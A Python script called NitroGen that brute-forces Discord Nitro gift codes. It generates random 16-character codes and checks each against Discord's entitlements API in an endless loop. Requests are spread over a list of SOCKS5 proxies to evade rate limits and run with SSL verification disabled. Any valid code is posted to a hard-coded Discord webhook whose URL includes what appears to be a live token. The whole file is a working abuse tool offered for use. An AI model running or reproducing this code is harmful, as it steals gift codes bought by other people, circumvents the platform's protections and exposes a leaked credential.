import random
import string
import aiohttp
import colorama
import aiojobs
import asyncio


try:
    import uvloop
except ImportError:
    pass
else:
    uvloop.install()

from aiohttp_socks import ProxyConnector, ProxyConnectionError
from discord import AsyncWebhookAdapter, Webhook
from aiohttp import ClientTimeout
from colorama import Fore
from os import path
from typing import List


class NitroGen:
    def __init__(self, webhook: str) -> None:
        colorama.init()

        self.total_requests = 0
        self.failed_requests = 0
        self.successful_requests = 0

        self.webhook = webhook

        proxy_path = path.join(
            path.dirname(path.realpath(__file__)),
            "socks5_proxies.txt"
        )

        with open(proxy_path, "r") as f_:
            proxies = f_.read().strip().split()

        self.sessions: List[aiohttp.ClientSession] = []
        for proxy in proxies:
            self.sessions.append(
                aiohttp.ClientSession(
                    connector=ProxyConnector.from_url("socks5://" + proxy),
                    timeout=ClientTimeout(total=120)
                )
            )

        self.sessions_len = len(self.sessions) - 1

        print(Fore.GREEN + "Proxies loaded!")

    async def generate_code(self, code: str = None) -> None:
        print(Fore.WHITE)

        if not code:
            code = "".join(random.choices(
                string.ascii_uppercase +
                string.digits +
                string.ascii_lowercase,
                k=16
            ))

        nitro = "https://discord.gift/" + code
        try:
            resp = await self.sessions[random.randint(0, self.sessions_len)].get(
                "https://discordapp.com/api/v6/entitlements/gift-codes/" +
                nitro
                + "?with_application=false&with_subscription_plan=true",
                verify_ssl=False
            )
        except ProxyConnectionError:
            print(Fore.YELLOW + "Proxy error, retrying")
            await self.generate_code(code)
        else:
            if resp.status == 200:
                self.successful_requests += 1
                print(Fore.GREEN + nitro)

                async with aiohttp.ClientSession() as session:
                    webhook = Webhook.from_url(
                        self.webhook,
                        adapter=AsyncWebhookAdapter(session)
                    )
                    await webhook.send(
                        f"@everyone \n```{nitro}```", username="Nitro Helper"
                    )

            elif resp.status == 429:
                timeout = (
                    resp.headers["X-RateLimit-Reset-After"]
                    if "X-RateLimit-Reset-After" in resp.headers else 1.0
                )
                print(Fore.CYAN + "Timeout, retrying in " + str(timeout))
                await asyncio.sleep(timeout)
                await self.generate_code(code)
            else:
                self.failed_requests += 1
                print(Fore.RED + nitro)

        self.total_requests += 1

        print(
            "\n",
            Fore.WHITE,
            "Total: ", Fore.WHITE, self.total_requests, " | ",
            "Failed: ", Fore.RED, self.failed_requests, " | ",
            Fore.WHITE,
            "Successful: ", Fore.GREEN, self.successful_requests,
            sep=""
        )

    async def close(self) -> None:
        for session in self.sessions:
            await session.close()


if __name__ == "__main__":
    async def main() -> None:
        nitro_gen = NitroGen(
            webhook="https://canary.discord.com/api/webhooks/830090228769095720/t-bONLH2W9D0kciBlU228AqK1Mn6t9eAcIGMhvtuL1309si8tkjj4bZ9Rs8mkLihPCo6"
        )
        scheduler = await aiojobs.create_scheduler()

        while True:
            await scheduler.spawn(nitro_gen.generate_code())

            await asyncio.sleep(0.1)

        await scheduler.close()
        await nitro_gen.close()

    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
    loop.close()
